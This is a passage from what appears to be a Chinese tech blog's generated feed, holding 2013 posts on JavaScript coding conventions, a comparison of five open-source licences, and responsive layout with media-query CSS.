class="line"></span><br></pre></td></tr></table></figure><ul><li>声明变量<strong><span>&nbsp;</span></strong><code><strong><span>=</span></strong>&nbsp;</code>前后<strong><span>（<code>必须）</code></span></strong>添加空格</li><li>每个变量的赋值声明以<code>,</code>结束后<span><strong>（<code>必须）</code></strong></span>换行进行下一个变量赋值声明</li><li><span><strong><code>（推荐）</code></strong></span>将所有不需要进行赋值的变量声明放置最后一行，且变量之间不需要换行</li><li><strong><span><code>（推荐）</code></span></strong>当一组变量声明完成后，空一行后编写其余代码</li></ul><p><strong>5.&nbsp;在同一个函数内部，<span>局部变量的声明</span><code>必须</code>置于顶端</strong></p><p>因为即使放到中间，js解析器也会提升至顶部<span>（hosting）</span></p><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的书写</span></span><br><span class="line"><span class="built_in">var</span> clear = function(el) &#123;</span><br><span class="line">    <span class="built_in">var</span> id = el.id,</span><br><span class="line">        name = el.getAttribute(<span class="string">&quot;data-name&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="params">...</span><span class="params">...</span><span class="params">...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不推荐的书写</span></span><br><span class="line"><span class="built_in">var</span> clear = function(el) &#123;</span><br><span class="line">    <span class="built_in">var</span> id = el.id;</span><br><span class="line"></span><br><span class="line">    <span class="params">...</span><span class="params">...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">var</span> name = el.getAttribute(<span class="string">&quot;data-name&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="params">...</span><span class="params">...</span><span class="params">...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;推荐阅读：<a href="http://www.adequatelygood.com/JavaScript-Scoping-and-Hoisting.html" target="_blank">JavaScript-Scoping-and-Hoisting</a></p><p><strong>6.&nbsp;块内函数<code>必须</code>用局部变量声明</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误的写法</span></span><br><span class="line"> <span class="keyword">var</span> call = <span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (name == <span class="string">&quot;hotel&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">             <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;hotel foo&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     foo &amp;&amp; foo();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 推荐的写法</span></span><br><span class="line"> <span class="keyword">var</span> call = <span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">     <span class="keyword">var</span> foo;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (name == <span class="string">&quot;hotel&quot;</span>) &#123;</span><br><span class="line">         foo = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">             <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;hotel foo&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     foo &amp;&amp; foo();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>引起的bug：第一种写法<code>foo</code>的声明被提前了; 调用<code>call</code>时：第一种写法会调用<code>foo</code>函数，第二种写法不会调用<code>foo</code>函数</span></p><p><em>注：不同浏览器解析不同，具体请移步汤姆大叔<a href="http://www.cnblogs.com/TomXu/archive/2012/01/30/2326372.html" target="_blank">深入解析Javascript函数篇</a></em></p><p><strong>7. <span>（<code>禁止）</code></span><span>使用<span>eval</span>，采取</span><span><code>$.parseJSON</code></span></strong></p><p><strong>&nbsp;三个原因：</strong></p><ul><li>有<span><strong>注入</strong></span>风险，尤其是ajax返回数据</li><li>不方便<span><strong>debug</strong></span></li><li><span><strong>效率低</strong></span>，eval是一个执行效率很低的函数</li></ul><p><strong>建议：</strong></p><p>　　使用<span><strong>new Function</strong></span>来代替eval的使用，最好就别用。</p><p><strong>8.&nbsp;除了<span>三目运算</span>，<span><code>if</code></span>,<span><code>else</code></span>等<span>（<code>禁止）</code></span>简写</strong></p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的书写</span></span><br><span class="line">if (true) &#123;</span><br><span class="line">    <span class="built_in">alert</span>(name);</span><br><span class="line">&#125;</span><br><span class="line">console<span class="selector-class">.log</span>(name);</span><br><span class="line"><span class="comment">// 不推荐的书写</span></span><br><span class="line">if (true)</span><br><span class="line">    <span class="built_in">alert</span>(name);</span><br><span class="line">console<span class="selector-class">.log</span>(name);</span><br><span class="line"><span class="comment">// 不推荐的书写</span></span><br><span class="line">if (true)</span><br><span class="line"><span class="built_in">alert</span>(name);</span><br><span class="line">console<span class="selector-class">.log</span>(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>9. <span>（<code>推荐）</code></span>在需要以<span><code>&#123;&#125;</code></span>闭合的代码段前增加换行，如：<span><code>for</code>&nbsp;<code>if</code></span></strong></p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 没有换行，小的代码段无法区分</span></span><br><span class="line"><span class="keyword">if</span> (wl<span class="operator"> &amp;&amp; </span>wl.length) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, l = wl.length; i &lt; l; ++i) &#123;</span><br><span class="line">        p = wl<span class="literal">[<span class="identifier">i</span>]</span>;</span><br><span class="line">        <span class="keyword">type</span> = <span class="module-access"><span class="module"><span class="identifier">Y</span>.</span><span class="module"><span class="identifier">Lang</span>.</span></span><span class="keyword">type</span>(r<span class="literal">[<span class="identifier">p</span>]</span>);</span><br><span class="line">        <span class="keyword">if</span> (s.has<span class="constructor">OwnProperty(<span class="params">p</span>)</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (merge<span class="operator"> &amp;&amp; </span><span class="keyword">type</span><span class="operator"> == </span>&#x27;<span class="keyword">object</span>&#x27;) &#123;</span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">Y</span>.</span></span>mix(r<span class="literal">[<span class="identifier">p</span>]</span>, s<span class="literal">[<span class="identifier">p</span>]</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ov<span class="operator"> || </span>!(p <span class="keyword">in</span> r)) &#123;</span><br><span class="line">                r<span class="literal">[<span class="identifier">p</span>]</span> = s<span class="literal">[<span class="identifier">p</span>]</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 有了换行，逻辑清楚多了</span></span><br><span class="line"><span class="keyword">if</span> (wl<span class="operator"> &amp;&amp; </span>wl.length) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, l = wl.length; i &lt; l; ++i) &#123;</span><br><span class="line">        p = wl<span class="literal">[<span class="identifier">i</span>]</span>;</span><br><span class="line">        <span class="keyword">type</span> = <span class="module-access"><span class="module"><span class="identifier">Y</span>.</span><span class="module"><span class="identifier">Lang</span>.</span></span><span class="keyword">type</span>(r<span class="literal">[<span class="identifier">p</span>]</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s.has<span class="constructor">OwnProperty(<span class="params">p</span>)</span>) &#123;</span><br><span class="line">            <span class="comment">// 处理merge逻辑</span></span><br><span class="line">            <span class="keyword">if</span> (merge<span class="operator"> &amp;&amp; </span><span class="keyword">type</span><span class="operator"> == </span>&#x27;<span class="keyword">object</span>&#x27;) &#123;</span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">Y</span>.</span></span>mix(r<span class="literal">[<span class="identifier">p</span>]</span>, s<span class="literal">[<span class="identifier">p</span>]</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ov<span class="operator"> || </span>!(p <span class="keyword">in</span> r)) &#123;</span><br><span class="line">                r<span class="literal">[<span class="identifier">p</span>]</span> = s<span class="literal">[<span class="identifier">p</span>]</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>换行可以是空行，也可以是注释</span></p><p><strong>10. <span>（<code>推荐）</code></span>使用<span><code>Function</code></span>进行类的定义，<span>(<code>不推荐)</code></span>继承，如需继承采用成熟的类库实现继承</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类的实现</span></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">     <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> me = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Nicholas&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 将this放到局部变量self</span></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">Persion</span>(<span class="params">name, sex</span>) &#123;</span><br><span class="line">     <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line"></span><br><span class="line">     self.<span class="property">name</span> = name;</span><br><span class="line">     self.<span class="property">sex</span> = sex;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;平时咱们写代码，基本都是小程序，真心用不上什么继承，而且继承并不是JS的擅长的语言特性，尽量少用。如果非要使用的话，注意一点：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="constructor">A()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="constructor">B()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">B</span>.</span></span>prototype = <span class="keyword">new</span> <span class="constructor">A()</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">B</span>.</span></span>prototype.constructor = B; <span class="comment">//原则上，记得把这句话加上</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;继承从原则上来讲，别改变他的构造函数，否则这个继承就显得很别扭了~&nbsp;</p><p><strong>11. <span>(<code>推荐)</code></span>使用局部变量<span>缓存反复查找的对象</span>(包括但不限于全局变量、dom查询结果、作用域链较深的对象)</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 缓存对象</span></span><br><span class="line"><span class="keyword">var</span> getComment = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> dom = $(<span class="string">&quot;#common-container&quot;</span>),               <span class="comment">// 缓存dom</span></span><br><span class="line">        appendTo = $.appendTo,                      <span class="comment">// 缓存全局变量</span></span><br><span class="line">        data = <span class="variable language_">this</span>.<span class="property">json</span>.<span class="property">data</span>;                      <span class="comment">// 缓存作用域链较深的对象</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;</p><p><strong>12.&nbsp;当需要缓存<span><code>this</code></span>时必须使用<span><code>self</code></span>变量进行缓存</strong></p><figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 缓存this</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Row</span><span class="params">(name)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> <span class="keyword">self</span> = this;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">self</span>.name = name;</span><br><span class="line">     $(<span class="string">&quot;.row&quot;</span>).click(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="keyword">self</span>.getName();</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;self是一个保留字，不过用它也没关系。在这里，看个人爱好吧，可以用<strong><span>_this</span></strong>, <span><strong>that</strong></span>, <span><strong>me</strong></span>等这些词，都行，但是团队开发的时候统一下比较好。</p><p><strong>13. <span>（<code>不推荐）</code></span><span>超长函数, 当函数超过<span>100</span>行，就要想想是否能将函数拆为两个或多个函数</span></strong></p><p><strong>14. <span>等你来填坑~</span></strong></p><h3><span><strong>小结</strong></span></h3><p><span>　　规范是死的，罗列这些东西，目的是为了让程序猿们对这些东西引起注意，平时写代码的时候注意格式，不仅仅方便了自己，也让其他阅读者看得舒服。</span></p><p><span>　　</span><span>可能还有一些点没有涉及到，</span><span><strong>如果你有好的建议，请提出来，我们一起打造一个良好的前端生态环境！</strong></span></p><p><strong>相关阅读：</strong><a href="http://www.cnblogs.com/hustskyking/p/css-spec.html" target="_blank">前端编码规范之CSS</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>五种开源协议的比较(BSD,Apache,GPL,LGPL,MIT) – 整理</title>
      <link href="/blog/2013/08/13/cb-license/"/>
      <url>/blog/2013/08/13/cb-license/</url>
      
        <content type="html"><![CDATA[<p>当Adobe、Microsoft、Sun等一系列巨头开始表现出对"开源"的青睐时，"开源"的时代即将到来！</p><p>最初来自：sinoprise.com/read.php?tid-662-page-e-fpage-1.html（遗憾的是这个链接已经打不开了），我基本未改动，只是进行了一些排版和整理。参考文献：<a href="http://www.fsf.org/licensing/licenses/">http://www.fsf.org/licensing/licenses/</a></p><p>现今存在的开源协议很多，而经过Open Source Initiative组织通过批准的开源协议目前有58种（<a href="http://www.opensource.org/licenses/alphabetical">http://www.opensource.org/licenses/alphabetical</a>）。我们在常见的开源协议如BSD, GPL, LGPL,MIT等都是OSI批准的协议。如果要开源自己的代码，最好也是选择这些被批准的开源协议。</p><p>这里我们来看四种最常用的开源协议及它们的适用范围，供那些准备开源或者使用开源产品的开发人员/厂家参考。</p><p><strong>BSD开源协议（</strong><a href="http://www.fsf.org/licensing/licenses/index_html#OriginalBSD">original BSD license</a><strong>、</strong><a id="FreeBSD" name="FreeBSD" href="http://www.freebsd.org/copyright/freebsd-license.html">FreeBSD license</a><strong>、</strong><a id="OriginalBSD" name="OriginalBSD" href="http://www.xfree86.org/3.3.6/COPYRIGHT2.html#6">Original BSD license</a><strong>）</strong></p><p>BSD开源协议是一个给于使用者很大自由的协议。基本上使用者可以"为所欲为",可以自由的使用，修改源代码，也可以将修改后的代码作为开源或者专有软件再发布。</p><p>但"为所欲为"的前提当你发布使用了BSD协议的代码，或则以BSD协议代码为基础做二次开发自己的产品时，需要满足三个条件：</p><ol><li>如果再发布的产品中包含源代码，则在源代码中必须带有原来代码中的BSD协议。</li><li>如果再发布的只是二进制类库/软件，则需要在类库/软件的文档和版权声明中包含原来代码中的BSD协议。</li><li>不可以用开源代码的作者/机构名字和原来产品的名字做市场推广。</li></ol><p>BSD 代码鼓励代码共享，但需要尊重代码作者的著作权。BSD由于允许使用者修改和重新发布代码，也允许使用或在BSD代码上开发商业软件发布和销售，因此是对商业集成很友好的协议。而很多的公司企业在选用开源产品的时候都首选BSD协议，因为可以完全控制这些第三方的代码，在必要的时候可以修改或者二次开发。</p><p><strong>Apache Licence 2.0（</strong><a href="http://www.apache.org/licenses/LICENSE-2.0">Apache License, Version 2.0</a>、<a href="http://www.apache.org/LICENSE-1.1">Apache License, Version 1.1</a>、<a href="http://www.apache.org/LICENSE-1.0">Apache License, Version 1.0</a><strong>）</strong></p><p>Apache Licence是著名的非盈利开源组织Apache采用的协议。该协议和BSD类似，同样鼓励代码共享和尊重原作者的著作权，同样允许代码修改，再发布（作为开源或商业软件）。需要满足的条件也和BSD类似：</p><ol><li>需要给代码的用户一份Apache Licence</li><li>如果你修改了代码，需要再被修改的文件中说明。</li><li>在延伸的代码中（修改和有源代码衍生的代码中）需要带有原来代码中的协议，商标，专利声明和其他原来作者规定需要包含的说明。</li><li>如果再发布的产品中包含一个Notice文件，则在Notice文件中需要带有Apache Licence。你可以在Notice中增加自己的许可，但不可以表现为对Apache Licence构成更改。</li></ol><p>Apache Licence也是对商业应用友好的许可。使用者也可以在需要的时候修改代码来满足需要并作为开源或商业产品发布/销售。</p><p><strong>GPL（</strong><a id="GNUGPL" name="GNUGPL" href="http://www.fsf.org/licensing/licenses/gpl.html">GNU General Public License</a><strong>）</strong></p><p>我们很熟悉的Linux就是采用了GPL。GPL协议和BSD, Apache Licence等鼓励代码重用的许可很不一样。GPL的出发点是代码的开源/免费使用和引用/修改/衍生代码的开源/免费使用，但不允许修改后和衍生的代码做为闭源的商业软件发布和销售。这也就是为什么我们能用免费的各种linux，包括商业公司的linux和linux上各种各样的由个人，组织，以及商业软件公司开发的免费软件了。</p><p>GPL协议的主要内容是只要在一个软件中使用(\使用"指类库引用，修改后的代码或者衍生代码)GPL 协议的产品，则该软件产品必须也采用GPL协议，既必须也是开源和免费。<strong>这就是所谓的"传染性"</strong>。GPL协议的产品作为一个单独的产品使用没有任何问题，还可以享受免费的优势。</p><p>由于GPL严格要求使用了GPL类库的软件产品必须使用GPL协议，对于使用GPL协议的开源代码，商业软件或者对代码有保密要求的部门就不适合集成/采用作为类库和二次开发的基础。</p><p>其它细节如再发布的时候需要伴随GPL协议等和BSD/Apache等类似。</p><p><strong>LGPL（</strong><a id="LGPL" name="LGPL" href="http://www.fsf.org/licensing/licenses/lgpl.html">GNU Lesser General Public License</a><strong>）</strong></p><p>LGPL是GPL的一个为主要为类库使用设计的开源协议。和GPL要求任何使用/修改/衍生之GPL类库的的软件必须采用GPL协议不同。LGPL允许商业软件通过类库引用(link)方式使用LGPL类库而不需要开源商业软件的代码。这使得采用LGPL协议的开源代码可以被商业软件作为类库引用并发布和销售。</p><p>但是如果修改LGPL协议的代码或者衍生，则所有修改的代码，涉及修改部分的额外代码和衍生的代码都必须采用LGPL协议。因此LGPL协议的开源代码很适合作为第三方类库被商业软件引用，但不适合希望以LGPL协议代码为基础，通过修改和衍生的方式做二次开发的商业软件采用。</p><p>GPL/LGPL都保障原作者的知识产权，避免有人利用开源代码复制并开发类似的产品</p><p><strong>MIT（<a href="http://www.opensource.org/licenses/mit-license.php">MIT</a>）</strong></p><p>MIT是和BSD一样宽范的许可协议,作者只想保留版权,而无任何其他了限制.也就是说,你必须在你的发行版里包含原许可协议的声明,无论你是以二进制发布的还是以源代码发布的.</p><p id="gulink">本文来自：<a title="五种开源协议的比较(BSD,Apache,GPL,LGPL,MIT) – 整理" href="http://www.awflasher.com/blog/archives/939">http://www.awflasher.com/blog/archives/939</a></p>]]></content>
      
      
      <categories>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>那些年，我们一起玩过的响应式布局</title>
      <link href="/blog/2013/08/11/cb-responsive-web-desigin/"/>
      <url>/blog/2013/08/11/cb-responsive-web-desigin/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;博客园的资源很丰富，也很精彩。不过这些精彩的东西放到一些移动终端上阅览就不堪入目了，<span>体验相当不好</span>。</p><p>&nbsp;&nbsp;<img src="https://images.cnitblog.com/blog/387325/201308/11111006-2d09cc55663d4efaab0b4e7c9f734775.png" alt="" width="386" height="686"></p><p>&nbsp;你可以忍受每一次打开博客，还得放大屏幕阅读么？整个屏幕都挤满了很小很小的文字，反正我是受够了。</p><p>&nbsp;所以，我们需要改变！！！ 先看看什么是响应式布局，你所看的这篇文章就是采用响应时布局~ <span>（<strong>现代浏览器才能看到效果</strong>）</span></p><h3>什么是响应式布局</h3><p>我的理解就是，<span>为了让用户享受更好的体验效果，给用户展现最有价值的信息，让同一个页面在不同终端上有不一样的展现效果</span>。比如你正在阅读的这篇博客，当你缩小（放大）浏览器窗口时<em>（先滚动顶部，因为顶部做了比较多的修改，效果比较明显）</em>，你会看到这些神奇的效果。</p><p><span><strong>正常情况下</strong></span>，顶部是这样的：</p><p><img src="https://images.cnitblog.com/blog/387325/201308/11111800-ae1213c1cbe34476b2d4401a788ac48d.jpg" alt="" width="691" height="362"></p><p><span><strong>稍微缩小一点</strong></span>，是这样的：</p><ul><li>变化一：about那个块不见了</li><li>变化二：浮动的推荐<反对框偏移了</li></ul><p><img src="https://images.cnitblog.com/blog/387325/201308/11111900-eee34c4fac6342f585c1d91681d52e4a.jpg" alt="" width="690" height="449"></p><p><span><strong>再缩小一点</strong></span>：</p><ul><li>变化一：背景图片不见了</li><li>变化二：右侧sidebar块跑到文章下面去了</li></ul><p><img src="https://images.cnitblog.com/blog/387325/201308/11112040-da39f5f2f3d04f6bb07917930be7f098.jpg" alt="" width="591" height="525"></p><p><span><strong>还可以再小一点</strong></span>，</p><p>　　这个变化就相当大了，很多东西都不见了，元素的位置也改变了</p><p><img src="https://images.cnitblog.com/blog/387325/201308/11112203-fd25eec77a92454292437db2ca0a40a8.jpg" alt="" width="436" height="564"></p><p>　　那么，什么是响应式布局，你有了一定的理解么~</p><h3>技术什么的不是关键，关键是设计</h3><p>　　技术太普遍了，大家都会用，可是<span>真正让用户感到舒适的，还是好的设计</span>。<span>我是这样考虑的：</span></p><p><strong>1. 屏幕分类：</strong></p><p>　　根据移动终端的尺寸（分辨率），我大概做了这么些分类：</p><p>　　←480px &nbsp; 481px~700px &nbsp; 701px~960px &nbsp; 961px→</p><p>　　首先搞清楚你的用户群所使用的终端类型和比例，这是2012年第二季度的统计数据</p><p><img src="https://images.cnitblog.com/blog/387325/201308/11112952-d5d987f9fc6247a7afc34ac7d46b87ff.gif" alt=""></p><p><span>　　iPhone、Nokia、HTC、Samsung和Moto 五个品牌的移动终端位居前五位，占比分别为22.13%、13.98 和11.69%、10.87% 和7.47%，其次为Huawei、Sony 和ZTE 等。</span></p><p><span>　　感兴趣的话，可以去搜搜这些终端的分辨率是多少，然后针对这些数据做一个分类~我不多说了。</span></p><p><strong><span>2. 不同的需求</span></strong></p><p><strong><span>　　</span></strong><span>一个比较小的屏幕能够容纳多少数据，展现多少信息，这一点必须把握住，比如当设备宽度是480像素的时候，我们没必要展现太多的信息，因为你展现出来用户也不会看，这些<span>冗余信息只会影响用户对信息主次的判断，甚至他们会觉得这些冗余信息太多，而跳过你的内容</span>。</span></p><p><span>　　我的设计是这样的：</span></p><p><img src="https://images.cnitblog.com/blog/387325/201308/11113624-b63e08b4fa52468abde3a2c0ea331d00.jpg" alt="" width="406" height="524"></p><p><img src="https://images.cnitblog.com/blog/387325/201308/11113648-0fc153eca1cc433e89023b9ed037a4ac.jpg" alt="" width="405" height="575"></p><p>&nbsp;我的页面只包括这些内容，像随笔分类、随笔档案，友情链接，推荐链接等，<span>这些信息又多又占空间，应该去除!</span></p><p>&nbsp;再比如：刚开始的时候，那个推荐<反对的块及贴在文章的右侧，当窗口缩小之后，我把他放到了右下角，再小些，为了展示更多的内容，直接把他给隐藏了~</p><h3>关于技术</h3><p>技术核心是Media Query，网上都说烂了。</p><p><strong>给推荐两篇博文：</strong></p><ul><li><a title="Read 'The State Of Responsive Web Design'" href="http://mobile.smashingmagazine.com/2013/05/29/the-state-of-responsive-web-design/" rel="bookmark" target="_blank">The State Of Responsive Web Design</a></li><li><p class="post_title fs24 f_w"><a title="响应式布局这件小事" href="http://www.jiawin.com/response-type-layout-design/" rel="bookmark" target="_blank">响应式布局这件小事</a></p></li></ul><p>这两个<span>博客的布局也是响应式布局</span>。</p><p><strong>需要注意的几个点：</strong></p><p>　　1. head中记得加上这句话：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;width=device-width; initial-scale=1.0&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　如果不加，效果就是本文第一章图所示，文字会很小很多的挤在一个页面上。</p><p>　　2. media query虽然好用，<strong><span>但是低版本IE不支持</span></strong>，不要纠结，咱把他给忽视掉~O(&cap;_&cap;)O~</p><p>　　如果你太固执一定要考虑的话，推荐这个：<a href="//code.google.com/p/css3-mediaqueries-js/">//code.google.com/p/css3-mediaqueries-js/</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if lt IE 9]&gt;</span></span><br><span class="line"><span class="comment">     &lt;script src=&quot;https://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;/script&gt; &lt;![endif]--&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　把这句话加到你的代码顶部，我试过了，相当不好用，响应式效果甚微。</p><h3>关于测试工具</h3><p>　　1. 这个网站，你可以试试，戳<a href="http://dfcb.github.io/Responsivator/" target="_blank">测试工具</a></p><p>　　2. chrome下有一个插件，叫做Moblile/Tablet Divice Testing，下载地址：<a href="//chrome.google.com/webstore/detail/mobiletablet-device-testi/elmekokodcohlommfikpmojheggnbelo" target="_blank">戳我</a></p><p><img src="https://images.cnitblog.com/blog/387325/201308/11115330-20656f7059b8442b8d4443946c499ad5.jpg" alt=""></p><h3>本文响应式布局代码</h3><p>说了半天，有些童鞋可能等不及想去试试了~</p><p>晒晒我弄的几行代码，有兴趣的可以参考下：<a href="http://files.cnblogs.com/hustskyking/media-480.css" target="_blank">../file/media-480.css</a></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*====================== media =========================*/</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">480px</span>) &#123;</span><br><span class="line">    <span class="selector-tag">html</span>, <span class="selector-tag">body</span> &#123;</span><br><span class="line">        <span class="attribute">background</span>: none;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">ul</span><span class="selector-id">#topMnu</span>,</span><br><span class="line">    <span class="selector-tag">a</span><span class="selector-class">.minyx</span>,</span><br><span class="line">    <span class="selector-id">#rss</span>,</span><br><span class="line">    <span class="selector-id">#sideLeft</span>,</span><br><span class="line">    <span class="selector-id">#sideRight</span>,</span><br><span class="line">    <span class="selector-id">#menu</span>,</span><br><span class="line">    <span class="selector-id">#profile_block</span> &#123;</span><br><span class="line">        <span class="attribute">display</span>: none;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#container</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">96%</span>;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">2%</span>;</span><br><span class="line">        <span class="attribute">min-width</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#content</span> &#123;</span><br><span class="line">        <span class="attribute">margin-right</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">float</span>: none;</span><br><span class="line">        <span class="attribute">padding-top</span>: <span class="number">310px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#sidebar</span> &#123;</span><br><span class="line">        <span class="attribute">margin-left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        <span class="attribute">float</span>: none;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.commentbox_title</span>,</span><br><span class="line">    <span class="selector-id">#tbCommentBody</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">96%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#about</span> &#123;</span><br><span class="line">        <span class="attribute">position</span>: absolute;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">96%</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">80px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#div_digg</span> &#123;</span><br><span class="line">        <span class="attribute">position</span>: static;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> &#123;</span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">30px</span>;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">20px</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">        <span class="attribute">float</span>: none;</span><br><span class="line">        <span class="attribute">border</span>: none;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        <span class="attribute">display</span>: 